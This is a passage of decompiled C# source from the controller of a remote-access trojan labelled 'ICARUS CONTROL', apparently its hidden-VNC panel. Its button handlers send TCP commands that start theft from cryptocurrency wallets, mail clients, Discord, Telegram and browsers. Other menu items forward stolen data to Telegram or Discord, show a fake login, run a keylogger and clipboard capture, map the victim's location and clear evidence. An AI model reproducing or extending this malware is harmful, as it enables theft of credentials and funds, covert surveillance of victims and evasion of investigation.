			if (!btnSputnik.Text.Contains("Started"))
			{
				if (chkClone.Checked)
				{
					if (FrmTransfer0.IsDisposed)
					{
						FrmTransfer0 = new MoveBytes();
					}
					FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
					FrmTransfer0.Hide();
					SendTCP("1002*" + Conversions.ToString(true), (TcpClient)Tag);
					btnSputnik.Text = "Sputnik Started";
				}
				else
				{
					SendTCP("1002*" + Conversions.ToString(false), (TcpClient)Tag);
					btnSputnik.Text = "Sputnik Started";
				}
			}
			else
			{
				SendTCP("2006*" + Conversions.ToString(false), (TcpClient)Tag);
				btnSputnik.Text = "Sputnik Stopped";
			}
		}

		// Token: 0x0600078F RID: 1935 RVA: 0x00049104 File Offset: 0x00047304
		private void btn360_Click(object sender, EventArgs e)
		{
			if (!btn360.Text.Contains("Started"))
			{
				if (chkClone.Checked)
				{
					if (FrmTransfer0.IsDisposed)
					{
						FrmTransfer0 = new MoveBytes();
					}
					FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
					FrmTransfer0.Hide();
					SendTCP("991*" + Conversions.ToString(true), (TcpClient)Tag);
					btn360.Text = "360 Started";
				}
				else
				{
					SendTCP("991*" + Conversions.ToString(false), (TcpClient)Tag);
					btn360.Text = "360 Started";
				}
			}
			else
			{
				SendTCP("2007*" + Conversions.ToString(false), (TcpClient)Tag);
				btn360.Text = "360 Stopped";
			}
		}

		// Token: 0x06000790 RID: 1936 RVA: 0x0004920C File Offset: 0x0004740C
		private void btnWatcher_Click(object sender, EventArgs e)
		{
			if (!btnWatcher.Text.Contains("Started"))
			{
				SendTCP("1008*" + Conversions.ToString(false), (TcpClient)Tag);
				btnWatcher.Text = "Watcher Started";
			}
			else
			{
				SendTCP("2008*" + Conversions.ToString(false), (TcpClient)Tag);
				btnWatcher.Text = "Watcher Stopped";
			}
		}

		// Token: 0x06000791 RID: 1937 RVA: 0x0000A57C File Offset: 0x0000877C
		private void btnRootkit_Click(object sender, EventArgs e)
		{
			contextMenuStrip3.Show(btnRootkit, 0, btnRootkit.Height);
		}

		// Token: 0x06000792 RID: 1938 RVA: 0x0000A59B File Offset: 0x0000879B
		private void studioButton2_Click(object sender, EventArgs e)
		{
			SendTCP("2011*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x06000793 RID: 1939 RVA: 0x0000984F File Offset: 0x00007A4F
		private void studioButton5_Click(object sender, EventArgs e)
		{
			Close();
		}

		// Token: 0x06000794 RID: 1940 RVA: 0x0000A1EC File Offset: 0x000083EC
		private void studioButton4_Click(object sender, EventArgs e)
		{
			WindowState = FormWindowState.Maximized;
		}

		// Token: 0x06000795 RID: 1941 RVA: 0x0000A1F5 File Offset: 0x000083F5
		private void studioButton3_Click(object sender, EventArgs e)
		{
			WindowState = FormWindowState.Normal;
		}

		// Token: 0x06000796 RID: 1942 RVA: 0x000099B3 File Offset: 0x00007BB3
		private void studioButton2_Click_1(object sender, EventArgs e)
		{
			WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000797 RID: 1943 RVA: 0x0000A5BE File Offset: 0x000087BE
		private void studioButton6_Click(object sender, EventArgs e)
		{
			contextMenuStrip2.Show(studioButton6, 0, studioButton6.Height);
		}

		// Token: 0x06000798 RID: 1944 RVA: 0x00049298 File Offset: 0x00047498
		private void electrumToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!electrumToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2026*" + Conversions.ToString(false), (TcpClient)Tag);
				electrumToolStripMenuItem.Text = "Electrum Started";
			}
			else
			{
				SendTCP("2027*" + Conversions.ToString(false), (TcpClient)Tag);
				electrumToolStripMenuItem.Text = "Electrum Stopped";
			}
		}

		// Token: 0x06000799 RID: 1945 RVA: 0x00049324 File Offset: 0x00047524
		private void armoryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!armoryToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2014*" + Conversions.ToString(false), (TcpClient)Tag);
				armoryToolStripMenuItem.Text = "Armory Started";
			}
			else
			{
				SendTCP("2015*" + Conversions.ToString(false), (TcpClient)Tag);
				armoryToolStripMenuItem.Text = "Armory Stopped";
			}
		}

		// Token: 0x0600079A RID: 1946 RVA: 0x000493B0 File Offset: 0x000475B0
		private void GuardaItem_Click(object sender, EventArgs e)
		{
			if (!GuardaItem.Text.Contains("Started"))
			{
				SendTCP("2018*" + Conversions.ToString(false), (TcpClient)Tag);
				GuardaItem.Text = "Guarda Started";
			}
			else
			{
				SendTCP("2019*" + Conversions.ToString(false), (TcpClient)Tag);
				GuardaItem.Text = "Guarda Stopped";
			}
		}

		// Token: 0x0600079B RID: 1947 RVA: 0x0004943C File Offset: 0x0004763C
		private void coinomiToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!coinomiToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2016*" + Conversions.ToString(false), (TcpClient)Tag);
				coinomiToolStripMenuItem.Text = "Coinomi Started";
			}
			else
			{
				SendTCP("2017*" + Conversions.ToString(false), (TcpClient)Tag);
				coinomiToolStripMenuItem.Text = "Coinomi Stopped";
			}
		}

		// Token: 0x0600079C RID: 1948 RVA: 0x000494C8 File Offset: 0x000476C8
		private void exodusToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!exodusToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2020*" + Conversions.ToString(false), (TcpClient)Tag);
				exodusToolStripMenuItem.Text = "Exodus Started";
			}
			else
			{
				SendTCP("2021*" + Conversions.ToString(false), (TcpClient)Tag);
				exodusToolStripMenuItem.Text = "Exodus Stopped";
			}
		}

		// Token: 0x0600079D RID: 1949 RVA: 0x00049554 File Offset: 0x00047754
		private void atomicToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!atomicToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2022*" + Conversions.ToString(false), (TcpClient)Tag);
				atomicToolStripMenuItem.Text = "Atomic Started";
			}
			else
			{
				SendTCP("2023*" + Conversions.ToString(false), (TcpClient)Tag);
				atomicToolStripMenuItem.Text = "Atomic Stopped";
			}
		}

		// Token: 0x0600079E RID: 1950 RVA: 0x000495E0 File Offset: 0x000477E0
		private void jaxxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!jaxxToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2024*" + Conversions.ToString(false), (TcpClient)Tag);
				jaxxToolStripMenuItem.Text = "Jaxx Started";
			}
			else
			{
				SendTCP("2025*" + Conversions.ToString(false), (TcpClient)Tag);
				jaxxToolStripMenuItem.Text = "Jaxx Stopped";
			}
		}

		// Token: 0x0600079F RID: 1951 RVA: 0x0004966C File Offset: 0x0004786C
		private void outlookToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			if (!outlookToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("555*" + Conversions.ToString(false), (TcpClient)Tag);
				outlookToolStripMenuItem.Text = "Outlook Started";
			}
			else
			{
				SendTCP("2028*" + Conversions.ToString(false), (TcpClient)Tag);
				outlookToolStripMenuItem.Text = "Outlook Stopped";
			}
		}

		// Token: 0x060007A0 RID: 1952 RVA: 0x000496F8 File Offset: 0x000478F8
		private void foxmailToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			if (!foxmailToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("556*" + Conversions.ToString(false), (TcpClient)Tag);
				foxmailToolStripMenuItem.Text = "Foxmail Started";
			}
			else
			{
				SendTCP("2030*" + Conversions.ToString(false), (TcpClient)Tag);
				foxmailToolStripMenuItem.Text = "Foxmail Stopped";
			}
		}

		// Token: 0x060007A1 RID: 1953 RVA: 0x00049784 File Offset: 0x00047984
		private void thunderbirdToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			if (!thunderbirdToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("557*" + Conversions.ToString(false), (TcpClient)Tag);
				thunderbirdToolStripMenuItem.Text = "Thunderbird Started";
			}
			else
			{
				SendTCP("2031*" + Conversions.ToString(false), (TcpClient)Tag);
				thunderbirdToolStripMenuItem.Text = "Thunderbird Stopped";
			}
		}

		// Token: 0x060007A2 RID: 1954 RVA: 0x00049810 File Offset: 0x00047A10
		private void skypeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!skypeToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2032*" + Conversions.ToString(false), (TcpClient)Tag);
				skypeToolStripMenuItem.Text = "Skype Started";
			}
			else
			{
				SendTCP("2033*" + Conversions.ToString(false), (TcpClient)Tag);
				skypeToolStripMenuItem.Text = "Skype Stopped";
			}
		}

		// Token: 0x060007A3 RID: 1955 RVA: 0x0004989C File Offset: 0x00047A9C
		private void discordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!discordToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2034*" + Conversions.ToString(false), (TcpClient)Tag);
				discordToolStripMenuItem.Text = "Discord Started";
			}
			else
			{
				SendTCP("2035*" + Conversions.ToString(false), (TcpClient)Tag);
				discordToolStripMenuItem.Text = "Discord Stopped";
			}
		}

		// Token: 0x060007A4 RID: 1956 RVA: 0x00049928 File Offset: 0x00047B28
		private void telegramToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!telegramToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2036*" + Conversions.ToString(false), (TcpClient)Tag);
				telegramToolStripMenuItem.Text = "Telegram Started";
			}
			else
			{
				SendTCP("2037*" + Conversions.ToString(false), (TcpClient)Tag);
				telegramToolStripMenuItem.Text = "Telegram Stopped";
			}
		}

		// Token: 0x060007A5 RID: 1957 RVA: 0x0000A5DD File Offset: 0x000087DD
		private void studioButton7_Click(object sender, EventArgs e)
		{
			contextMenuStrip4.Show(studioButton7, 0, studioButton7.Height);
		}

		// Token: 0x060007A6 RID: 1958 RVA: 0x0000A5FC File Offset: 0x000087FC
		private void studioButton9_Click(object sender, EventArgs e)
		{
			contextMenuStrip5.Show(studioButton9, 0, studioButton9.Height);
		}

		// Token: 0x060007A7 RID: 1959 RVA: 0x000499B4 File Offset: 0x00047BB4
		private void msinfo32exeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!msinfo32exeToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2052*" + Conversions.ToString(false), (TcpClient)Tag);
				msinfo32exeToolStripMenuItem.Text = "SystemInfo Started";
			}
			else
			{
				SendTCP("2053*" + Conversions.ToString(false), (TcpClient)Tag);
				msinfo32exeToolStripMenuItem.Text = "SystemInfo Stopped";
			}
		}

		// Token: 0x060007A8 RID: 1960 RVA: 0x00049A40 File Offset: 0x00047C40
		private void mstscexeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!mstscexeToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2054*" + Conversions.ToString(false), (TcpClient)Tag);
				mstscexeToolStripMenuItem.Text = "Mstsc Started";
			}
			else
			{
				SendTCP("2055*" + Conversions.ToString(false), (TcpClient)Tag);
				mstscexeToolStripMenuItem.Text = "Mstsc Stopped";
			}
		}

		// Token: 0x060007A9 RID: 1961 RVA: 0x0000A61B File Offset: 0x0000881B
		private void timer3_Tick(object sender, EventArgs e)
		{
			SendTCP("19*" + Conversions.ToString(ResizeScroll.Value / 100.0), tcpClient_0);
		}

		// Token: 0x060007AA RID: 1962 RVA: 0x00049ACC File Offset: 0x00047CCC
		private void notepadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!notepadToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2040*" + Conversions.ToString(false), (TcpClient)Tag);
				notepadToolStripMenuItem.Text = "Notepad Started";
			}
			else
			{
				SendTCP("2041*" + Conversions.ToString(false), (TcpClient)Tag);
				notepadToolStripMenuItem.Text = "Notepad Stopped";
			}
		}

		// Token: 0x060007AB RID: 1963 RVA: 0x00049B58 File Offset: 0x00047D58
		private void controlPanelToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!controlPanelToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2038*" + Conversions.ToString(false), (TcpClient)Tag);
				controlPanelToolStripMenuItem.Text = "Control Started";
			}
			else
			{
				SendTCP("2039*" + Conversions.ToString(false), (TcpClient)Tag);
				controlPanelToolStripMenuItem.Text = "Control Stopped";
			}
		}

		// Token: 0x060007AC RID: 1964 RVA: 0x00049BE4 File Offset: 0x00047DE4
		private void studioButton8_Click_1(object sender, EventArgs e)
		{
			Help help = new Help();
			help.ShowDialog();
		}

		// Token: 0x060007AD RID: 1965 RVA: 0x0000A64E File Offset: 0x0000884E
		private void studioButton10_Click(object sender, EventArgs e)
		{
			contextMenuStrip6.Show(studioButton10, 0, studioButton10.Height);
		}

		// Token: 0x060007AE RID: 1966 RVA: 0x00049C00 File Offset: 0x00047E00
		private void stealAndSendToTelegramToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (TGDC0.IsDisposed)
			{
				TGDC0 = new TGtoDSC();
			}
			TGDC0.Tag = RuntimeHelpers.GetObjectValue(Tag);
			TGDC0.Text = Text.Replace(string.Concat(" ICARUS CONTROL", versioning(), " [ Connected: ", userName, "  ] "), null);
			TGDC0.Show();
		}

		// Token: 0x060007AF RID: 1967 RVA: 0x00049C00 File Offset: 0x00047E00
		private void stealAndSendToDiscordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (TGDC0.IsDisposed)
			{
				TGDC0 = new TGtoDSC();
			}
			TGDC0.Tag = RuntimeHelpers.GetObjectValue(Tag);
			TGDC0.Text = Text.Replace(string.Concat(" ICARUS CONTROL", versioning(), " [ Connected: ", userName, "  ] "), null);
			TGDC0.Show();
		}

		// Token: 0x060007B0 RID: 1968 RVA: 0x00049C94 File Offset: 0x00047E94
		private void comodoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!comodoToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("996*" + Conversions.ToString(false), (TcpClient)Tag);
				comodoToolStripMenuItem.Text = "Comodo Started";
			}
			else
			{
				SendTCP("2057*" + Conversions.ToString(false), (TcpClient)Tag);
				comodoToolStripMenuItem.Text = "Comodo Stopped";
			}
		}

		// Token: 0x060007B1 RID: 1969 RVA: 0x00049D20 File Offset: 0x00047F20
		private void yandexToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!yandexToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("1006*" + Conversions.ToString(false), (TcpClient)Tag);
				yandexToolStripMenuItem.Text = "Yandex Started";
			}
			else
			{
				SendTCP("2056*" + Conversions.ToString(false), (TcpClient)Tag);
				yandexToolStripMenuItem.Text = "Yandex Stopped";
			}
		}

		// Token: 0x060007B2 RID: 1970 RVA: 0x00049DAC File Offset: 0x00047FAC
		private void operaNeonToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!operaNeonToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("998*" + Conversions.ToString(false), (TcpClient)Tag);
				operaNeonToolStripMenuItem.Text = "OperaNeon Started";
			}
			else
			{
				SendTCP("2060*" + Conversions.ToString(false), (TcpClient)Tag);
				operaNeonToolStripMenuItem.Text = "OperaNeon Stopped";
			}
		}

		// Token: 0x060007B3 RID: 1971 RVA: 0x00049E38 File Offset: 0x00048038
		private void waterFoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!waterFoxToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("1005*" + Conversions.ToString(false), (TcpClient)Tag);
				waterFoxToolStripMenuItem.Text = "Waterfox Started";
			}
			else
			{
				SendTCP("2061*" + Conversions.ToString(false), (TcpClient)Tag);
				waterFoxToolStripMenuItem.Text = "Waterfox Stopped";
			}
		}

		// Token: 0x060007B4 RID: 1972 RVA: 0x00049EC4 File Offset: 0x000480C4
		private void orbitumToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!orbitumToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("999*" + Conversions.ToString(false), (TcpClient)Tag);
				orbitumToolStripMenuItem.Text = "Orbitum Started";
			}
			else
			{
				SendTCP("2062*" + Conversions.ToString(false), (TcpClient)Tag);
				orbitumToolStripMenuItem.Text = "Orbitum Stopped";
			}
		}

		// Token: 0x060007B5 RID: 1973 RVA: 0x00049F50 File Offset: 0x00048150
		private void atomToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!atomToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("992*" + Conversions.ToString(false), (TcpClient)Tag);
				atomToolStripMenuItem.Text = "Atom Started";
			}
			else
			{
				SendTCP("2063*" + Conversions.ToString(false), (TcpClient)Tag);
				atomToolStripMenuItem.Text = "Atom Stopped";
			}
		}

		// Token: 0x060007B6 RID: 1974 RVA: 0x00049FDC File Offset: 0x000481DC
		private void slimjetToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!slimjetToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("1001*" + Conversions.ToString(false), (TcpClient)Tag);
				slimjetToolStripMenuItem.Text = "Slimjet Started";
			}
			else
			{
				SendTCP("2064*" + Conversions.ToString(false), (TcpClient)Tag);
				slimjetToolStripMenuItem.Text = "Slimjet Stopped";
			}
		}

		// Token: 0x060007B7 RID: 1975 RVA: 0x0004A068 File Offset: 0x00048268
		private void dingTalkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!dingTalkToolStripMenuItem.Text.Contains("Started"))
			{
				SendTCP("2058*" + Conversions.ToString(false), (TcpClient)Tag);
				dingTalkToolStripMenuItem.Text = "DingTalk Started";
			}
			else
			{
				SendTCP("2059*" + Conversions.ToString(false), (TcpClient)Tag);
				dingTalkToolStripMenuItem.Text = "DingTalk Stopped";
			}
		}

		// Token: 0x060007B8 RID: 1976 RVA: 0x0000A66D File Offset: 0x0000886D
		private void downloadLogsViaSocketToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("2065*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x060007B9 RID: 1977 RVA: 0x0000A690 File Offset: 0x00008890
		private void clearEvidenceToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("2066*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x060007BA RID: 1978 RVA: 0x0000A409 File Offset: 0x00008609
		private void studioButton11_Click(object sender, EventArgs e)
		{
			SendTCP("8587*", (TcpClient)Tag);
		}

		// Token: 0x060007BB RID: 1979 RVA: 0x000063EF File Offset: 0x000045EF
		private void button3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007BC RID: 1980 RVA: 0x0004A0F4 File Offset: 0x000482F4
		public hVNC()
		{
			int_0 = 0;
			bool_1 = true;
			bool_2 = false;
			FrmTransfer0 = new MoveBytes();
			TGDC0 = new TGtoDSC();
			TGDCF = new IWhoamiN();
			InitializeComponent();
			VNCBox.MouseEnter += VNCBox_MouseEnter;
			VNCBox.MouseLeave += VNCBox_MouseLeave;
			VNCBox.KeyPress += VNCBox_KeyPress;
		}

		// Token: 0x170001D9 RID: 473
		// (get) Token: 0x060007BD RID: 1981 RVA: 0x0004A1A8 File Offset: 0x000483A8
		// (set) Token: 0x060007BE RID: 1982 RVA: 0x0000A6B3 File Offset: 0x000088B3
		public string TextBoxValue
		{
			get
			{
				return txtKeyl.Text;
			}
			set
			{
				txtKeyl.Text = value;
			}
		}

		// Token: 0x060007BF RID: 1983 RVA: 0x0000A6C1 File Offset: 0x000088C1
		private void timer4_Tick(object sender, EventArgs e)
		{
			toolStripStatusLabel3.Text = "Idle";
			FrmTransfer0.FileTransferLabele.Text = "Idle";
		}

		// Token: 0x060007C0 RID: 1984 RVA: 0x0003FF24 File Offset: 0x0003E124
		public static string versioning()
		{
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(executingAssembly.Location);
			return versionInfo.ProductVersion;
		}

		// Token: 0x060007C1 RID: 1985 RVA: 0x0004A1C4 File Offset: 0x000483C4
		private void fakeLoginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (TGDCF.IsDisposed)
			{
				TGDCF = new IWhoamiN();
			}
			TGDCF.Tag = RuntimeHelpers.GetObjectValue(Tag);
			TGDCF.Text = Text.Replace(string.Concat(" ICARUS CONTROL", versioning(), " [ Connected: ", userName, "  ] "), null);
			TGDCF.Show();
		}

		// Token: 0x060007C2 RID: 1986 RVA: 0x000063EF File Offset: 0x000045EF
		private void killAllAntivusesToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007C3 RID: 1987 RVA: 0x0000A6E8 File Offset: 0x000088E8
		private void studioButton12_Click(object sender, EventArgs e)
		{
			SendTCP("2071*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x060007C4 RID: 1988 RVA: 0x000063EF File Offset: 0x000045EF
		private void startToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007C5 RID: 1989 RVA: 0x0000A70B File Offset: 0x0000890B
		private void btnKeyl_Click(object sender, EventArgs e)
		{
			contextMenuStrip7.Show(btnKeyl, 0, btnKeyl.Height);
		}

		// Token: 0x170001DA RID: 474
		// (get) Token: 0x060007C6 RID: 1990 RVA: 0x0000A72A File Offset: 0x0000892A
		// (set) Token: 0x060007C7 RID: 1991 RVA: 0x0000A732 File Offset: 0x00008932
		public string MyProperty { get; set; }

		// Token: 0x060007C8 RID: 1992 RVA: 0x0004A258 File Offset: 0x00048458
		private void timer5_Tick(object sender, EventArgs e)
		{
			if (chkKeylog.Checked)
			{
				try
				{
					studioButton12.PerformClick();
					txtKeyl.ScrollToCaret();
					return;
				}
				catch
				{
					return;
				}
			}
			SendTCP("2070*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x060007C9 RID: 1993 RVA: 0x0000A73B File Offset: 0x0000893B
		private void stopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("2070*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x060007CA RID: 1994 RVA: 0x0004A2C0 File Offset: 0x000484C0
		private void chkClip_CheckedChanged(object sender, EventArgs e)
		{
			if (chkClip.Checked)
			{
				try
				{
					btnClip.PerformClick();
					txtClip.ScrollToCaret();
					return;
				}
				catch
				{
					return;
				}
			}
			SendTCP("2073*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x060007CB RID: 1995 RVA: 0x0000A75E File Offset: 0x0000895E
		private void txtKeyl_TextChanged(object sender, EventArgs e)
		{
			txtKeyl.SelectionStart = txtKeyl.Text.Length;
			txtKeyl.ScrollToCaret();
		}

		// Token: 0x060007CC RID: 1996 RVA: 0x0000A786 File Offset: 0x00008986
		private void txtClip_TextChanged(object sender, EventArgs e)
		{
			txtClip.SelectionStart = txtClip.Text.Length;
			txtClip.ScrollToCaret();
		}

		// Token: 0x060007CD RID: 1997 RVA: 0x0000A7AE File Offset: 0x000089AE
		private void btnClip_Click(object sender, EventArgs e)
		{
			SendTCP("2072*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x060007CE RID: 1998 RVA: 0x000063EF File Offset: 0x000045EF
		private void button1_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x060007CF RID: 1999 RVA: 0x0004A328 File Offset: 0x00048528
		private void chkInfo_CheckedChanged(object sender, EventArgs e)
		{
			if (chkInfo.Checked)
			{
				try
				{
					btnInfo.PerformClick();
				}
				catch
				{
				}
			}
		}

		// Token: 0x060007D0 RID: 2000 RVA: 0x0000A7D1 File Offset: 0x000089D1
		private void btnInfo_Click(object sender, EventArgs e)
		{
			SendTCP("2074*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x060007D1 RID: 2001 RVA: 0x0004A328 File Offset: 0x00048528
		private void timer6_Tick(object sender, EventArgs e)
		{
			if (chkInfo.Checked)
			{
				try
				{
					btnInfo.PerformClick();
				}
				catch
				{
				}
			}
		}

		// Token: 0x060007D2 RID: 2002 RVA: 0x0004A364 File Offset: 0x00048564
		private void timer7_Tick(object sender, EventArgs e)
		{
			if (chkClip.Checked)
			{
				try
				{
					btnClip.PerformClick();
					txtClip.ScrollToCaret();
				}
				catch
				{
				}
			}
		}

		// Token: 0x060007D3 RID: 2003 RVA: 0x0000A7F4 File Offset: 0x000089F4
		private void timer8_Tick(object sender, EventArgs e)
		{
			SendTCP("2068*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x060007D4 RID: 2004 RVA: 0x0000A817 File Offset: 0x00008A17
		private void timer9_Tick(object sender, EventArgs e)
		{
			SendTCP("2167*" + Conversions.ToString(false), (TcpClient)Tag);
		}

		// Token: 0x060007D5 RID: 2005 RVA: 0x0004A3AC File Offset: 0x000485AC
		private void studioButton13_Click(object sender, EventArgs e)
		{
			try
			{
				map.MapProvider = GMapProviders.BingHybridMap;
				double num = Convert.ToDouble(txtlatitude.Text);
				double num2 = Convert.ToDouble(txtlongitude.Text);
				map.Position = new PointLatLng(num, num2);
				map.MinZoom = 5;
				map.MaxZoom = 100;
				map.Zoom = 10.0;
				PointLatLng pointLatLng = new PointLatLng(num, num2);
				GMapMarker gmapMarker = new GMarkerGoogle(pointLatLng, GMarkerGoogleType.lightblue_pushpin);
				GMapOverlay gmapOverlay = new GMapOverlay("markers");
				gmapOverlay.Markers.Add(gmapMarker);
				map.Overlays.Add(gmapOverlay);
			}
			catch
			{
			}
		}

		// Token: 0x060007D6 RID: 2006 RVA: 0x000063EF File Offset: 0x000045EF
		protected override void OnResize(EventArgs eventArgs_0)
		{
		}

		// Token: 0x060007D7 RID: 2007 RVA: 0x000063EF File Offset: 0x000045EF
		private void mousemoveREAL(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x060007D8 RID: 2008 RVA: 0x000063EF File Offset: 0x000045EF
		private void mousemoveDOWN(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x060007D9 RID: 2009 RVA: 0x000063EF File Offset: 0x000045EF
		private void mousemoveUP(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x060007DA RID: 2010 RVA: 0x000063EF File Offset: 0x000045EF
		private void button5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007DB RID: 2011 RVA: 0x000063EF File Offset: 0x000045EF
		private void button6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007DC RID: 2012 RVA: 0x000063EF File Offset: 0x000045EF
		private void button4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007DD RID: 2013 RVA: 0x000063EF File Offset: 0x000045EF
		private void button2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007DE RID: 2014 RVA: 0x000063EF File Offset: 0x000045EF
		private void button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007DF RID: 2015 RVA: 0x0004A480 File Offset: 0x00048680
		private void timer10_Tick(object sender, EventArgs e)
		{
			try
			{
				map.MapProvider = GMapProviders.BingHybridMap;
				map.Overlays.Clear();
				double num = Convert.ToDouble(txtlatitude.Text);
				double num2 = Convert.ToDouble(txtlongitude.Text);
				map.Position = new PointLatLng(num, num2);
				map.MinZoom = 5;
				map.MaxZoom = 100;
				map.Zoom = 10.0;
				PointLatLng pointLatLng = new PointLatLng(num, num2);
				GMapMarker gmapMarker = new GMarkerGoogle(pointLatLng, GMarkerGoogleType.lightblue_pushpin);
				GMapOverlay gmapOverlay = new GMapOverlay("markers");
				gmapOverlay.Markers.Add(gmapMarker);
				map.Overlays.Add(gmapOverlay);
			}
			catch
			{
			}
		}

		// Token: 0x060007E0 RID: 2016 RVA: 0x0004A564 File Offset: 0x00048764
		private void timer11_Tick(object sender, EventArgs e)
		{
			try
			{
			}
			catch
			{
			}
		}

		// Token: 0x060007E1 RID: 2017 RVA: 0x000063EF File Offset: 0x000045EF
		private void stealAllWalletsToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007E6 RID: 2022 RVA: 0x0000A868 File Offset: 0x00008A68
		void method_0(object object_0)
		{
			ActiveControl = object_0 as Control;
		}

		// Token: 0x0400052A RID: 1322
		private TcpClient tcpClient_0;

		// Token: 0x0400052B RID: 1323
		private int int_0;

		// Token: 0x0400052C RID: 1324
		private bool bool_1;

		// Token: 0x0400052D RID: 1325
		private bool bool_2;

		// Token: 0x0400052E RID: 1326
		public MoveBytes FrmTransfer0;

		// Token: 0x0400052F RID: 1327
		public static Random random = new Random();

		// Token: 0x04000530 RID: 1328
		public MoveBytes MoveBytes0;

		// Token: 0x04000531 RID: 1329
		public TGtoDSC TGDC0;

		// Token: 0x04000532 RID: 1330
		public IWhoamiN TGDCF;

		// Token: 0x04000533 RID: 1331
		public GForm0 RDF;

		// Token: 0x04000534 RID: 1332
		private string userName = Environment.UserName;

		// Token: 0x04000536 RID: 1334
		public Size size_0;

		// Token: 0x04000537 RID: 1335
		private Point point_0 = new Point(1, 1);

		// Token: 0x0200009A RID: 154
		private class BlueRenderer : ToolStripProfessionalRenderer
		{
			// Token: 0x060007E7 RID: 2023 RVA: 0x00046A7C File Offset: 0x00044C7C
			protected override void OnRenderMenuItemBackground(ToolStripItemRenderEventArgs toolStripItemRenderEventArgs_0)
			{
				Rectangle rectangle = new Rectangle(Point.Empty, toolStripItemRenderEventArgs_0.Item.Size);
				Color color = (toolStripItemRenderEventArgs_0.Item.Selected ? Color.White : Color.White);
				using (SolidBrush solidBrush = new SolidBrush(color))
				{
					toolStripItemRenderEventArgs_0.Graphics.FillRectangle(solidBrush, rectangle);
				}
				if (!toolStripItemRenderEventArgs_0.Item.Selected)
				{
					toolStripItemRenderEventArgs_0.Item.ForeColor = Color.Black;
					base.OnRenderMenuItemBackground(toolStripItemRenderEventArgs_0);
				}
				else
				{
